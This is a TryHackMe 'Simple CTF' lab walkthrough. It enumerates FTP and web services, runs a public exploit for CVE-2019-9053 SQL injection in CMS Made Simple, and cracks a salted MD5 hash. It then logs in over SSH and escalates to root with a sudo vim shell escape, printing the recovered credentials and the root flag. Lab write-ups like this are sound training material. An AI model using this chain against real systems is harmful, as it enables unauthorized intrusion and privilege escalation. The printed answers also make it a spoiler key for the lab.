# 🧩 TryHackMe — Simple CTF

> **Network Enumeration | FTP Enumeration | Web Enumeration | CMS Made Simple | SQL Injection | CVE-2019-9053 | SSH | Linux Privilege Escalation**

![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Linux%20Privilege%20Escalation-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

---

## 📌 Overview

**Simple CTF** is an easy-level TryHackMe Linux machine that focuses on basic network enumeration, FTP enumeration, web directory discovery, exploitation of a vulnerable CMS, SSH access, and Linux privilege escalation.

The machine exposes FTP, HTTP, and SSH services. Anonymous FTP access reveals a file containing useful information about the system user.

Web enumeration reveals a `/simple/` directory running **CMS Made Simple**. The application is vulnerable to **CVE-2019-9053**, a time-based SQL injection vulnerability.

The vulnerability can be used to extract the CMS username, password hash, and salt. The password hash can then be cracked to obtain the password for the `mitch` account.

After gaining SSH access, `sudo -l` reveals that `vim` can be executed as root without a password. Vim can then be abused to spawn a root shell.

### 🎯 Attack Path

```text
Nmap Enumeration
       │
       ▼
FTP Enumeration
       │
       ▼
Anonymous FTP Login
       │
       ▼
ForMitch.txt
       │
       ▼
Web Enumeration
       │
       ▼
/simple/
       │
       ▼
CMS Made Simple
       │
       ▼
CVE-2019-9053
       │
       ▼
SQL Injection
       │
       ▼
Username + Salt + Password Hash
       │
       ▼
Password Cracking
       │
       ▼
mitch : secret
       │
       ▼
SSH Port 2222
       │
       ▼
User Access
       │
       ▼
sudo -l
       │
       ▼
/usr/bin/vim
       │
       ▼
Vim Shell Escape
       │
       ▼
Root Shell
```

---

# 🔎 1. Nmap Enumeration
I started by performing service and version enumeration against the target.
```
nmap -sV -sC <TARGET_IP>
```
The scan identified three open ports:
```
21/tcp    open    ftp
80/tcp    open    http
2222/tcp  open    ssh
```

<img width="830" height="612" alt="1" src="https://github.com/user-attachments/assets/7a0b1721-91e3-4aa3-bde5-5fea2853a0ab" />

The Nmap scan also revealed:
```
Anonymous FTP login allowed
```
This made FTP the first service worth investigating.

---

# 📂 2. FTP Enumeration
I connected to the FTP service:
```
ftp <TARGET_IP>

220 (vsFTPd 3.0.3)
```
I attempted anonymous authentication:
```
Name: anonymous
```
The server accepted the login:
```
230 Login successful.
```

After logging in, I listed the available directories:
```
ls
```
The server returned:
```
pub
```

<img width="520" height="326" alt="2" src="https://github.com/user-attachments/assets/b9ca45fe-1b80-4fd3-a34f-1aea26e7f4b2" />

---

# 📁 3. Enumerating the FTP Directory
I entered the pub directory:
```
cd pub
```
Then listed its contents:
```
ls
```
A file called:
```
ForMitch.txt
```
was found.

This file appeared to be specifically intended for the `mitch` user, making it worth investigating.

<img width="568" height="121" alt="3" src="https://github.com/user-attachments/assets/597708c3-ca1d-4e60-ba10-61014df77eb4" />

---

# 📥 4. Downloading ForMitch.txt
I downloaded the file using:
```
mget *
```

The transfer completed successfully:
```
226 Transfer complete.
```
The file was now available locally.

<img width="343" height="113" alt="4" src="https://github.com/user-attachments/assets/4c4c6c78-1454-4327-8694-281b9aa822cd" />

---

# 📝 5. Reading ForMitch.txt
I read the downloaded file:
```
cat ForMitch.txt
```
The message said:
```
Dammit man... you're the worst dev I've seen.
You set the same pass for the system user,
and the password is so weak...
i cracked it in seconds.
```

This provided two important clues:
- There is a system user named **Mitch**.
- The password is weak and may be reused.
However, the password itself was not directly provided.
We therefore continued with web enumeration.

<img width="1236" height="84" alt="5" src="https://github.com/user-attachments/assets/307a0b99-c354-429d-864f-b137b9d0870c" />

---

# 🌐 6. Web Enumeration
Port `80` was running an Apache web server.
I opened:
```
http://<TARGET_IP>
```
The server displayed the default Apache Ubuntu page.

The default page itself did not reveal much information, so I checked `robots.txt`.

<img width="877" height="451" alt="6" src="https://github.com/user-attachments/assets/bee1aad9-5088-4ecf-a8b1-bcdf31438b75" />

---
# 🤖 7. Checking robots.txt
I opened:
```
http://<TARGET_IP>/robots.txt
```
 
The file contained two disallowed entries:
```
Disallow: /
Disallow: /openemr-5_0_1.3
```
The robots file did not directly reveal the application we were looking for, so I performed directory enumeration.

<img width="611" height="577" alt="7" src="https://github.com/user-attachments/assets/58251923-7c95-48cf-acff-9edc70380a1a" />

---

# 🔍 8. Directory Enumeration with Gobuster

I used Gobuster to discover hidden directories:
```
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
 
The scan discovered:
```
/simple
```
with HTTP status:
```
301 Moved Permanently
```
This was an interesting discovery.
I opened:
```
http://<TARGET_IP>/simple/
```

<img width="886" height="304" alt="8" src="https://github.com/user-attachments/assets/4192bb65-34e4-4c86-a835-111d76ace16a" />

---

# 🧩 9. Discovering CMS Made Simple

The `/simple/` directory hosted a website powered by **CMS Made Simple**.
 
The page contained the typical CMS Made Simple interface.
At the bottom of the page, the application identified itself as:
```
CMS Made Simple
```
 
This gave us a specific application to investigate for known vulnerabilities.

<img width="1226" height="474" alt="9" src="https://github.com/user-attachments/assets/8e7cf669-62e7-491f-8746-5a19933d52dd" />
<img width="317" height="69" alt="10" src="https://github.com/user-attachments/assets/467c4c1d-80e2-480f-a1b0-c6b08db24d32" />

---

# 🔎 10. Identifying the Vulnerability
After identifying the application as **CMS Made Simple**, I investigated known vulnerabilities affecting the CMS.
The exploit included in this lab is:
```
CVE-2019-9053
```
The vulnerability affects vulnerable versions of CMS Made Simple and allows an unauthenticated time-based SQL injection.
The exploit script used in this lab was:
```
46635.py
```
The script itself identifies:
```
Exploit Title:
Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9

CVE:
CVE-2019-9053
```

---

# 💉 11. Exploiting CVE-2019-9053
The exploit was executed against the `/simple/` directory:
```
python3 46635.py -u http://<TARGET_IP>/simple/
```

 <img width="464" height="59" alt="11-1" src="https://github.com/user-attachments/assets/8f140a3a-269f-4508-8044-a27cca41dffa" />

The exploit successfully extracted several pieces of information from the CMS database.
It discovered:
```
Salt for password found:
1dac0d92e9fa6bb2

Username found:
mitch

Email found:
admin@adminU

Password hash:
0c01f4468bd75d7a84c7eb73846e8d96
```
 
The important information was:
```
Username:
mitch

Salt:
1dac0d92e9fa6bb2

Password Hash:
0c01f4468bd75d7a84c7eb73846e8d96
```

<img width="421" height="95" alt="11-2" src="https://github.com/user-attachments/assets/6041c195-abe5-4bf8-a204-05f0cb4abaa7" />

---

# 🔐 12. Cracking the Password
The CMS password was stored as an MD5 hash combined with a salt.
The hash-cracking logic was:
```
digest = hashlib.md5((salt + password).encode()).hexdigest()
```

The provided script tested passwords from:
```
rockyou.txt
```
against the recovered hash.

I used the following script:

<img width="753" height="246" alt="11-3" src="https://github.com/user-attachments/assets/9872ea1a-0181-4bd9-a610-4894186a39fa" />

```
python3 check.py
```
 
The recovered password was:
```
secret
```

<img width="298" height="68" alt="11-4" src="https://github.com/user-attachments/assets/f630a988-ee7f-4659-b82e-832f9999f915" />

Therefore, we now had:
```
Username: mitch
Password: secret
```

---

# 💻 13. SSH Access
Nmap showed that SSH was running on port `2222` rather than the default port `22`.
I used the recovered credentials to connect:
```
ssh -p 2222 mitch@<TARGET_IP>
```
The authentication was successful.

We now had a shell as:
```
mitch
```
I verified the current working directory:
```
pwd
```
which returned:
```
/home/mitch
```

<img width="223" height="97" alt="12" src="https://github.com/user-attachments/assets/937f2b38-1982-4948-a714-414625e621a2" />

---

# 🔍 14. Checking Sudo Permissions
The next step was to determine what commands `mitch` could execute with elevated privileges.
I ran:
```
sudo -l
```
 
The result showed:
```
User mitch may run the following commands on Machine:

(root) NOPASSWD: /usr/bin/vim
```
This meant that `mitch` could execute Vim as root without entering a password.
This was the privilege-escalation opportunity.

<img width="449" height="57" alt="13" src="https://github.com/user-attachments/assets/484f6892-e408-4db4-857b-ca2283e79eed" />

---

# 🧨 15. Exploiting Vim for Privilege Escalation
Vim can execute external shell commands.
Since Vim could be executed as root, I used:
```
sudo vim -c ':!/bin/sh'
```
 
The command spawned a shell.
I verified the current user:
```
id
```
The output showed:
```
uid=0(root)
gid=0(root)
groups=0(root)
```
This confirmed that we had successfully obtained a root shell.

<img width="388" height="86" alt="14" src="https://github.com/user-attachments/assets/c442b2ab-739b-464e-8611-f9eca1a0d6ed" />

---

# 👑 18. Obtaining the Root Flag
After obtaining root privileges, I navigated to the /root directory:
```
cd /root
```
I listed the contents:
```
ls
```
The file:
```
root.txt
```
was present.
I read it:
```
cat root.txt
```
 
🏆 Root Flag
```
W3ll d0n3. You made it!
```
<img width="304" height="69" alt="15" src="https://github.com/user-attachments/assets/e5124c62-953c-46d3-b03d-0087b299e41e" />
